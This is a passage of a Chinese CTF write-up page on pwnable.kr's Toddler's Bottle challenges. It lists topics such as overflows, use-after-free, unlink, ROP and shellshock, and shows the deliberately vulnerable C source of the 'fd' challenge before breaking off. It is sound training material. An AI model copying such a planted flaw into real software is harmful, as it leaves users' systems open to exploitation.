
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Toddler's Bottle · Eki's CTF</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        <meta name="author" content="Eki">
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-katex/katex.min.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-multipart/multipart.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-advanced-emoji/emoji-website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-pageview-count/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-code/plugin.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-auto-scroll-table/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="../ethernaut/" />
    
    
    <link rel="prev" href="./" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    
    
        
        <li>
            <a href="https://ieki.xyz" target="_blank" class="custom-link">主站 Eki's Blog</a>
        </li>
    
    

    
    <li class="divider"></li>
    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    About
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../library/">
            
                <a href="../library/">
            
                    
                    Library
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../library/steganography.html">
            
                <a href="../library/steganography.html">
            
                    
                    Steganography
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../library/gdb-tutorial.html">
            
                <a href="../library/gdb-tutorial.html">
            
                    
                    GDB Tutorial
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../library/sqli.html">
            
                <a href="../library/sqli.html">
            
                    
                    SQL Inject
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" >
            
                <span>
            
                    
                    PHP
            
                </span>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.4.1" data-path="../library/php/function.html">
            
                <a href="../library/php/function.html">
            
                    
                    Functions
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.2" data-path="../library/php/protocol.html">
            
                <a href="../library/php/protocol.html">
            
                    
                    Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.3" data-path="../library/php/ace.html">
            
                <a href="../library/php/ace.html">
            
                    
                    ACE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.4" data-path="../library/php/serialize.html">
            
                <a href="../library/php/serialize.html">
            
                    
                    Serialize
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4.5" data-path="../library/php/misc.html">
            
                <a href="../library/php/misc.html">
            
                    
                    Misc
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.2.5" data-path="../library/htaccess.html">
            
                <a href="../library/htaccess.html">
            
                    
                    Apache .htaccess
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.6" data-path="../library/ssti.html">
            
                <a href="../library/ssti.html">
            
                    
                    SSTI
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.7" data-path="../library/ssrf.html">
            
                <a href="../library/ssrf.html">
            
                    
                    SSRF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.8" data-path="../library/xxe.html">
            
                <a href="../library/xxe.html">
            
                    
                    XXE
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.9" data-path="../library/xss.html">
            
                <a href="../library/xss.html">
            
                    
                    XSS
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.10" data-path="../library/shell.html">
            
                <a href="../library/shell.html">
            
                    
                    Shell
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.11" data-path="../library/crypto.html">
            
                <a href="../library/crypto.html">
            
                    
                    Crypto
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.12" data-path="../library/js.html">
            
                <a href="../library/js.html">
            
                    
                    JavaScript
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.13" data-path="../library/python.html">
            
                <a href="../library/python.html">
            
                    
                    Python
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.14" data-path="../library/bash.html">
            
                <a href="../library/bash.html">
            
                    
                    BASH
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.15" data-path="../library/forensics.html">
            
                <a href="../library/forensics.html">
            
                    
                    Forensics
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.16" data-path="../library/pentest.html">
            
                <a href="../library/pentest.html">
            
                    
                    Pentest
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.17" data-path="../library/protocol.html">
            
                <a href="../library/protocol.html">
            
                    
                    Protocol
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.18" data-path="../library/misc.html">
            
                <a href="../library/misc.html">
            
                    
                    MISC
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.19" data-path="../library/awd.html">
            
                <a href="../library/awd.html">
            
                    
                    AWD
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../contest/">
            
                <a href="../contest/">
            
                    
                    Contest
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../contest/hfctf-2021.html">
            
                <a href="../contest/hfctf-2021.html">
            
                    
                    2021数字中国创新大赛虎符网络安全赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../contest/hackergame-2019.html">
            
                <a href="../contest/hackergame-2019.html">
            
                    
                    Hackergame 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../contest/tsctf-j2019.html">
            
                <a href="../contest/tsctf-j2019.html">
            
                    
                    TSCTF-J 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../contest/nctf2019.html">
            
                <a href="../contest/nctf2019.html">
            
                    
                    NCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../contest/isoon-2019.html">
            
                <a href="../contest/isoon-2019.html">
            
                    
                    ISOON 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../contest/mrctf-2020.html">
            
                <a href="../contest/mrctf-2020.html">
            
                    
                    MRCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.7" data-path="../contest/hfctf-2020.html">
            
                <a href="../contest/hfctf-2020.html">
            
                    
                    2020数字中国创新大赛虎符网络安全赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.8" data-path="../contest/npuctf-2020.html">
            
                <a href="../contest/npuctf-2020.html">
            
                    
                    NPUCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.9" data-path="../contest/gkctf-2020.html">
            
                <a href="../contest/gkctf-2020.html">
            
                    
                    GKCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.10" data-path="../contest/sctf-2020.html">
            
                <a href="../contest/sctf-2020.html">
            
                    
                    SCTF 2020
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../adworld/">
            
                <a href="../adworld/">
            
                    
                    ADworld
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../adworld/misc-exercise-area.html">
            
                <a href="../adworld/misc-exercise-area.html">
            
                    
                    Misc Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.2" data-path="../adworld/crypto-execrise-area.html">
            
                <a href="../adworld/crypto-execrise-area.html">
            
                    
                    Crypto Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.3" data-path="../adworld/web-execrise-area.html">
            
                <a href="../adworld/web-execrise-area.html">
            
                    
                    Web Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.4" data-path="../adworld/pwn-exercise-area.html">
            
                <a href="../adworld/pwn-exercise-area.html">
            
                    
                    PWN Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.5" data-path="../adworld/reverse-execrise-area.html">
            
                <a href="../adworld/reverse-execrise-area.html">
            
                    
                    Reverse Exercise Area
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.6" data-path="../adworld/easy_tornado.html">
            
                <a href="../adworld/easy_tornado.html">
            
                    
                    Easy Tornado
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.7" data-path="../adworld/i-got-id-200.html">
            
                <a href="../adworld/i-got-id-200.html">
            
                    
                    i-got-id-200
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.8" data-path="../adworld/ics-02.html">
            
                <a href="../adworld/ics-02.html">
            
                    
                    ics-02
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.9" data-path="../adworld/ics-07.html">
            
                <a href="../adworld/ics-07.html">
            
                    
                    ics-07
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.10" data-path="../adworld/shrine.html">
            
                <a href="../adworld/shrine.html">
            
                    
                    shrine
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.11" data-path="../adworld/super_sqli.html">
            
                <a href="../adworld/super_sqli.html">
            
                    
                    super_sqli
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.12" data-path="../adworld/web_php_unserialize.html">
            
                <a href="../adworld/web_php_unserialize.html">
            
                    
                    Web_php_unserialize
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.13" data-path="../adworld/web_php_wrong_nginx_config.html">
            
                <a href="../adworld/web_php_wrong_nginx_config.html">
            
                    
                    web_php_wrong_nginx_config
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.14" data-path="../adworld/web_python_template_injection.html">
            
                <a href="../adworld/web_python_template_injection.html">
            
                    
                    Web_python_template_injection
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.15" data-path="../adworld/wtf.sh-150.html">
            
                <a href="../adworld/wtf.sh-150.html">
            
                    
                    wtf.sh-150
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.4.16" data-path="../adworld/zhuanxv.html">
            
                <a href="../adworld/zhuanxv.html">
            
                    
                    Zhuanxv
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="../buuoj/">
            
                <a href="../buuoj/">
            
                    
                    BUUOJ
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="../buuoj/suctf-2019.html">
            
                <a href="../buuoj/suctf-2019.html">
            
                    
                    SUCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="../buuoj/ciscn-northeast-2019.html">
            
                <a href="../buuoj/ciscn-northeast-2019.html">
            
                    
                    CISCN 2019 华北赛区
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.3" data-path="../buuoj/ciscn-pre-2019.html">
            
                <a href="../buuoj/ciscn-pre-2019.html">
            
                    
                    CISCN 2019 初赛
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.4" data-path="../buuoj/ciscn-final-2019.html">
            
                <a href="../buuoj/ciscn-final-2019.html">
            
                    
                    CISCN 2019 Final
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.5" data-path="../buuoj/de1ctf-2019.html">
            
                <a href="../buuoj/de1ctf-2019.html">
            
                    
                    De1CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.6" data-path="../buuoj/wangdingcup-2018.html">
            
                <a href="../buuoj/wangdingcup-2018.html">
            
                    
                    网鼎杯 2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.7" data-path="../buuoj/wangdingcup-2019.html">
            
                <a href="../buuoj/wangdingcup-2019.html">
            
                    
                    网鼎杯 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.8" data-path="../buuoj/roarctf-2019.html">
            
                <a href="../buuoj/roarctf-2019.html">
            
                    
                    RoarCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.9" data-path="../buuoj/0ctf-2016.html">
            
                <a href="../buuoj/0ctf-2016.html">
            
                    
                    0CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.10" data-path="../buuoj/gxyctf-2019.html">
            
                <a href="../buuoj/gxyctf-2019.html">
            
                    
                    GXYCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.11" data-path="../buuoj/hitcon-2017.html">
            
                <a href="../buuoj/hitcon-2017.html">
            
                    
                    Hitcon 2017
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.12" data-path="../buuoj/jikedatiaozhan-2019.html">
            
                <a href="../buuoj/jikedatiaozhan-2019.html">
            
                    
                    极客大挑战2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.13" data-path="../buuoj/lctf-2018.html">
            
                <a href="../buuoj/lctf-2018.html">
            
                    
                    LCTF 2018
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.14" data-path="../buuoj/de1ctf-2019.html">
            
                <a href="../buuoj/de1ctf-2019.html">
            
                    
                    De1CTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.15" data-path="../buuoj/swpu-2019.html">
            
                <a href="../buuoj/swpu-2019.html">
            
                    
                    SWPU 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.16" data-path="../buuoj/suctf-2019.html">
            
                <a href="../buuoj/suctf-2019.html">
            
                    
                    SUCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.17" data-path="../buuoj/bjdctf-2020.html">
            
                <a href="../buuoj/bjdctf-2020.html">
            
                    
                    BJDCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.18" data-path="../buuoj/rctf-2015.html">
            
                <a href="../buuoj/rctf-2015.html">
            
                    
                    RCTF 2015
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.19" data-path="../buuoj/bytectf-2019.html">
            
                <a href="../buuoj/bytectf-2019.html">
            
                    
                    ByteCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.20" data-path="../buuoj/qiangwangbei-2019.html">
            
                <a href="../buuoj/qiangwangbei-2019.html">
            
                    
                    强网杯 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.21" data-path="../buuoj/ddctf-2019.html">
            
                <a href="../buuoj/ddctf-2019.html">
            
                    
                    DDCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.22" data-path="../buuoj/eis-2019.html">
            
                <a href="../buuoj/eis-2019.html">
            
                    
                    EIS 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.23" data-path="../buuoj/vn-2020.html">
            
                <a href="../buuoj/vn-2020.html">
            
                    
                    V&N 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.24" data-path="../buuoj/fbctf-2019.html">
            
                <a href="../buuoj/fbctf-2019.html">
            
                    
                    FBCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.25" data-path="../buuoj/gyctf-2020.html">
            
                <a href="../buuoj/gyctf-2020.html">
            
                    
                    GYCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.26" data-path="../buuoj/bjd-2nd.html">
            
                <a href="../buuoj/bjd-2nd.html">
            
                    
                    BJDCTF 2nd
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.27" data-path="../buuoj/fireshellctf-2020.html">
            
                <a href="../buuoj/fireshellctf-2020.html">
            
                    
                    FireShellCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.28" data-path="../buuoj/gyctf-2020.html">
            
                <a href="../buuoj/gyctf-2020.html">
            
                    
                    GWCTF 2020
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.29" data-path="../buuoj/watevrctf-2019.html">
            
                <a href="../buuoj/watevrctf-2019.html">
            
                    
                    WatervrCTF
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.30" data-path="../buuoj/ciscn-southeast-2019.html">
            
                <a href="../buuoj/ciscn-southeast-2019.html">
            
                    
                    CISCN2019 华东南赛区
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.31" data-path="../buuoj/bsidescf-2019.html">
            
                <a href="../buuoj/bsidescf-2019.html">
            
                    
                    BsidesCTF 2019
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.32" data-path="../buuoj/rctf-2019.html">
            
                <a href="../buuoj/rctf-2019.html">
            
                    
                    RCTF 2019
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.6" data-path="./">
            
                <a href="./">
            
                    
                    pwnable.kr
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter active" data-level="1.6.1" data-path="toddlers-bottle.html">
            
                <a href="toddlers-bottle.html">
            
                    
                    Toddler's Bottle
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.7" data-path="../ethernaut/">
            
                <a href="../ethernaut/">
            
                    
                    Ethernaut
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8" data-path="../vulnhub/">
            
                <a href="../vulnhub/">
            
                    
                    Vulnhub
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.8.1" data-path="../vulnhub/dc-9.html">
            
                <a href="../vulnhub/dc-9.html">
            
                    
                    DC-9
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.2" data-path="../vulnhub/five86-1.html">
            
                <a href="../vulnhub/five86-1.html">
            
                    
                    five86-1
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.8.3" data-path="../vulnhub/wakanda.html">
            
                <a href="../vulnhub/wakanda.html">
            
                    
                    wakanda
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >Toddler's Bottle</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div class="search-plus" id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#pwnablekr-toddlers-bottle"><b></b>Pwnable.kr Toddler&apos;s Bottle</a></li><ul><li><span class="title-icon "></span><a href="#0x00-&#x524D;&#x8A00;"><b></b>0x00 &#x524D;&#x8A00;</a></li><li><span class="title-icon "></span><a href="#0x01-fd"><b></b>0x01 fd</a></li><ul><li><span class="title-icon "></span><a href="#exp"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x02-collision"><b></b>0x02 collision</a></li><ul><li><span class="title-icon "></span><a href="#exp_1"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x03-bof"><b></b>0x03 bof</a></li><li><span class="title-icon "></span><a href="#0x04-flag"><b></b>0x04 flag</a></li><li><span class="title-icon "></span><a href="#0x05-passcode"><b></b>0x05 passcode</a></li><li><span class="title-icon "></span><a href="#0x06-random"><b></b>0x06 random</a></li><li><span class="title-icon "></span><a href="#0x07-input"><b></b>0x07 input</a></li><ul><li><span class="title-icon "></span><a href="#stage-1-argv"><b></b>Stage 1 argv</a></li><li><span class="title-icon "></span><a href="#stage-2-stdio"><b></b>Stage 2 stdio</a></li><li><span class="title-icon "></span><a href="#stage3-env"><b></b>Stage3 env</a></li><li><span class="title-icon "></span><a href="#stage-4-file"><b></b>Stage 4 file</a></li><li><span class="title-icon "></span><a href="#stage-5-network"><b></b>Stage 5 network</a></li><li><span class="title-icon "></span><a href="#final"><b></b>Final</a></li></ul><li><span class="title-icon "></span><a href="#0x08-leg"><b></b>0x08 leg</a></li><ul><li><span class="title-icon "></span><a href="#exp_2"><b></b>Exp</a></li><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;"><b></b>&#x53C2;&#x8003;&#x8D44;&#x6599;</a></li></ul><li><span class="title-icon "></span><a href="#0x09-misktake"><b></b>0x09 misktake</a></li><ul><li><span class="title-icon "></span><a href="#exp_3"><b></b>Exp</a></li></ul><li><span class="title-icon "></span><a href="#0x0a--shellsock"><b></b>0x0A  shellsock</a></li><li><span class="title-icon "></span><a href="#0x0b-coin"><b></b>0x0B coin</a></li><li><span class="title-icon "></span><a href="#0x0c-blackjack"><b></b>0x0C blackjack</a></li><li><span class="title-icon "></span><a href="#0x0d-lotto"><b></b>0x0D lotto</a></li><li><span class="title-icon "></span><a href="#0x0e-cmd1"><b></b>0x0E cmd1</a></li><li><span class="title-icon "></span><a href="#0x0f-cmd2"><b></b>0x0F cmd2</a></li><li><span class="title-icon "></span><a href="#0x10-uaf"><b></b>0x10 uaf</a></li><ul><li><span class="title-icon "></span><a href="#&#x524D;&#x7F6E;&#x77E5;&#x8BC6;&#xFF1A;&#x7C7B;&#x91CD;&#x8F7D;&#xB7;&#x865A;&#x51FD;&#x6570;"><b></b>&#x524D;&#x7F6E;&#x77E5;&#x8BC6;&#xFF1A;&#x7C7B;&#x91CD;&#x8F7D;&#xB7;&#x865A;&#x51FD;&#x6570;</a></li><li><span class="title-icon "></span><a href="#use-after-free"><b></b>Use-After-Free</a></li><li><span class="title-icon "></span><a href="#&#x5206;&#x6790;&#x6E90;&#x7801;"><b></b>&#x5206;&#x6790;&#x6E90;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;_1"><b></b>&#x53C2;&#x8003;&#x8D44;&#x6599;</a></li></ul><li><span class="title-icon "></span><a href="#0x11-memcpy"><b></b>0x11 memcpy</a></li><li><span class="title-icon "></span><a href="#0x12-shellcode"><b></b>0x12 shellcode</a></li><li><span class="title-icon "></span><a href="#0x13-unlink"><b></b>0x13 unlink</a></li><ul><li><span class="title-icon "></span><a href="#&#x524D;&#x7F6E;&#x77E5;&#x8BC6;-dword-shoot"><b></b>&#x524D;&#x7F6E;&#x77E5;&#x8BC6; DWORD SHOOT</a></li><li><span class="title-icon "></span><a href="#exp_4"><b></b>Exp</a></li><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x8D44;&#x6599;&#xFF1A;"><b></b>&#x53C2;&#x8003;&#x8D44;&#x6599;&#xFF1A;</a></li></ul><li><span class="title-icon "></span><a href="#0x14-blukat"><b></b>0x14 blukat</a></li><li><span class="title-icon "></span><a href="#0x15-horcruxes"><b></b>0x15 horcruxes</a></li></ul></ul></div><a href="#pwnablekr-toddlers-bottle" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><h1 id="pwnablekr-toddlers-bottle"><a name="pwnablekr-toddlers-bottle" class="anchor-navigation-ex-anchor" href="#pwnablekr-toddlers-bottle"><i class="fa fa-link" aria-hidden="true"></i></a>Pwnable.kr Toddler&apos;s Bottle</h1>
<h2 id="0x00-&#x524D;&#x8A00;"><a name="0x00-&#x524D;&#x8A00;" class="anchor-navigation-ex-anchor" href="#0x00-&#x524D;&#x8A00;"><i class="fa fa-link" aria-hidden="true"></i></a>0x00 &#x524D;&#x8A00;</h2>
<p>&#x88AB;web&#x9898;&#x8650;&#x5230;&#x81EA;&#x95ED;&#x3002;&#x3002;&#x3002;&#x3002;
&#x60F3;&#x7740;&#x53BB;&#x6C34;&#x4E00;&#x6C34;pwn&#x7684;&#x65B0;&#x624B;&#x9898;&#x627E;&#x627E;&#x81EA;&#x4FE1;&#x3002;&#x3002;&#x3002;&#x3002;
&#x7ED3;&#x679C;&#x8FD8;&#x662F;&#x88AB;&#x8650;&#x3002;&#x3002;&#x3002;&#x3002;</p>
<p><a href="../assets/images/909866567.jpeg" data-lightbox="7106179b-db34-4950-be2e-d88421a0b76b" data-title="&#x6211;&#x7684;&#x505A;&#x9898;&#x5386;&#x7A0B;"><img src="../assets/images/909866567.jpeg" alt="&#x6211;&#x7684;&#x505A;&#x9898;&#x5386;&#x7A0B;"></a></p>
<p>&#x6700;&#x7EC8;&#x603B;&#x7B97;&#x662F;&#x8270;&#x96BE;&#x7684;&#x505A;&#x5B8C;&#x4E86;</p>
<p><a href="../assets/images/3176360730.jpg" data-lightbox="90a4613e-c6b0-4b68-b510-6b799f5bc044" data-title="&#x7ED3;&#x679C;"><img src="../assets/images/3176360730.jpg" alt="&#x7ED3;&#x679C;"></a></p>
<p>&#x6536;&#x8D27;&#xFF1A;</p>
<ul>
<li>pwntool ssh&#x7684;&#x8FDE;&#x63A5;&#x65B9;&#x6CD5;&#x548C;&#x5BF9;&#x5E94;exp&#x7684;&#x5199;&#x6CD5;</li>
<li>pwntool recvline &#x622A;leak&#x503C;&#x7684;&#x6280;&#x5DE7;</li>
<li>agrc agrv envp &#x7684;&#x610F;&#x4E49;</li>
<li>&#x7528;python &#x4EA4;&#x4E92;&#x884C;&#x5B8C;&#x6210;&#x7B80;&#x5355;&#x7684;&#x8FD0;&#x7B97;</li>
<li>&#x7ECF;&#x5178;&#x5806;/&#x6808;&#x6EA2;&#x51FA;</li>
<li>&#x7ECF;&#x5178;uaf</li>
<li>&#x7ECF;&#x5178;unlink</li>
<li>&#x7ECF;&#x5178;rop</li>
<li>&#x57FA;&#x7840;shellshock</li>
<li>pipe&#x901A;&#x4FE1;</li>
</ul>
<p>Todo:</p>
<ul>
<li>32/64&#x4F4D;&#x7A0B;&#x5E8F;&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x7406;&#x89E3;</li>
<li>&#x7ED3;&#x6784;&#x4F53;/&#x7C7B;&#x7684;&#x5185;&#x5B58;&#x5E03;&#x5C40;</li>
<li>socket&#x7F16;&#x7A0B;</li>
<li>&#x5BF9;&#x57FA;&#x7840;pwn&#x77E5;&#x8BC6;&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x4E86;&#x89E3;</li>
</ul>
<h2 id="0x01-fd"><a name="0x01-fd" class="anchor-navigation-ex-anchor" href="#0x01-fd"><i class="fa fa-link" aria-hidden="true"></i></a>0x01 fd</h2>
<p>&#x5229;&#x7528;pwntool&#x7684;ssh download_file&#x529F;&#x80FD;&#x4E0B;&#x8F7D;&#x6E90;&#x7801;</p>
<pre><code class="lang-cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[], <span class="hljs-keyword">char</span>* envp[])</span></span>{
    <span class="hljs-keyword">if</span>(argc&lt;<span class="hljs-number">2</span>){
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pass argv[1] a number\n&quot;</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    <span class="hljs-keyword">int</span> fd = atoi( argv[<span class="hljs-number">1</span>] ) - <span class="hljs-number">0x1234</span>;
    <span class="hljs-keyword">int</span> len = <span class="hljs-number">0</span>;
    len = read(fd, buf, <span class="hljs-number">32</span>);
    <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(<span class="hljs-string">&quot;LETMEWIN\n&quot;</span>, buf))
    ...
}
</code></pre>
<p><strong>&#x5173;&#x4E8E;agrc agrv envp</strong></p>
<blockquote>
